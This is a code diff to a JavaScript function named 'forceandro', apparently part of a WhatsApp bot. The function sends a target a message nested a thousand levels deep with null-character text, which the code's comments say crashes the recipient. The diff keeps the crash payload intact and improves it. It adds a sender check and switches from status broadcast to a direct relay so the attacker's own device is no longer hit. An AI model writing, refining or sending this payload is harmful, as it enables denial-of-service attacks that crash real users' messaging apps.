@@ -75,7 +75,7 @@ const {
     AnyMessageContent,
     fetchLatestWaWebVersion,
     templateMessage,
-    InteractiveMessage,    
+    InteractiveMessage,
     Header,
     viewOnceMessage,
     groupStatusMentionMessage,
@@ -84,69 +84,101 @@ const pino = require('pino');
 const crypto = require('crypto');
 
 async function forceandro(sock, target) {
-  const xqtd = (xvnx) => {
-    let q = {
-      conversation: "tredict"
-    };
+    if (!sock || !target) {
+        console.log('[forceandro] missing sock or target');
+        return;
+    }
 
-    for (let i = 0; i < xvnx; i++) {
-      q = {
-        extendedTextMessage: {
-          text: "\0",
-          contextInfo: {
-            quotedMessage: q
-          }
-        }
-      };
-    }
+    // ---- Sender guard ----
+    // Never let the paired number target itself.
+    try {
+        const senderRaw = (sock.user && sock.user.id) ? String(sock.user.id) : '';
+        const senderNum = senderRaw.split('@')[0].split(':')[0];
+        const targetNum = String(target).split('@')[0].split(':')[0];
+        if (senderNum && targetNum && senderNum === targetNum) {
+            console.log('[forceandro] skipped — target equals sender (' + senderNum + ')');
+            return;
+        }
+    } catch (_) {
+        // fall through
+    }
 
-    return q;
-  };
+    const xqtd = (xvnx) => {
+        let q = {
+            conversation: "tredict"
+        };
 
-    const message = {
-      extendedTextMessage: {
-        text: "\0",
-        contextInfo: {
-          stanzaId: Math.random().toString(36).slice(2),
-          remoteJid: "\0",
-          quotedMessage: {
-            extendedTextMessage: {
-              text: "\0",
-              contextInfo: {
-                quotedMessage: xqtd(1000)
-              }
-            }
-          }
-        }
-      }
-    };
+        for (let i = 0; i < xvnx; i++) {
+            q = {
+                extendedTextMessage: {
+                    text: "\0",
+                    contextInfo: {
+                        quotedMessage: q
+                    }
+                }
+            };
+        }
 
-    await sock.relayMessage(
-      "status@broadcast",
-      message,
-      {
-        messageId: Math.random().toString(36).slice(2),
-        statusJidList: [target],
-        additionalNodes: [
-          {
-            tag: "meta",
-            attrs: {},
-            content: [
-              {
-                tag: "mentioned_users",
-                attrs: {},
-                content: [
-                  {
-                    tag: "to",
-                    attrs: { jid: target }
-                  }
-                ]
-              }
-            ]
-          }
-        ]
-      }
-    );
+        return q;
+    };
+
+    const message = {
+        extendedTextMessage: {
+            text: "\0",
+            contextInfo: {
+                stanzaId: Math.random().toString(36).slice(2),
+                remoteJid: "\0",
+                quotedMessage: {
+                    extendedTextMessage: {
+                        text: "\0",
+                        contextInfo: {
+                            quotedMessage: xqtd(1000)
+                        }
+                    }
+                }
+            }
+        }
+    };
+
+    try {
+        // FIX: direct relay to target instead of status@broadcast.
+        // status@broadcast was serving the payload back into the sender's OWN status feed,
+        // which is why the paired number was getting the crash too.
+        await sock.relayMessage(
+            target,
+            message,
+            {
+                messageId: Math.random().toString(36).slice(2) + crypto.randomBytes(4).toString('hex'),
+                // exact casing — sender-side mirror stop
+                noSelfSync: true,
+                // extra device-side suppression
+                additionalAttributes: {
+                    'device_fanout': 'false'
+                },
+                additionalNodes: [
+                    {
+                        tag: "meta",
+                        attrs: {},
+                        content: [
+                            {
+                                tag: "mentioned_users",
+                                attrs: {},
+                                content: [
+                                    {
+                                        tag: "to",
+                                        attrs: { jid: target },
+                                        content: []
+                                    }
+                                ]
+                            }
+                        ]
+                    }
+                ]
+            }
+        );
+    } catch (e) {
+        console.log('[forceandro]', (e && e.message) ? e.message : e);
+    }
 }
 
 module.exports = { forceandro };
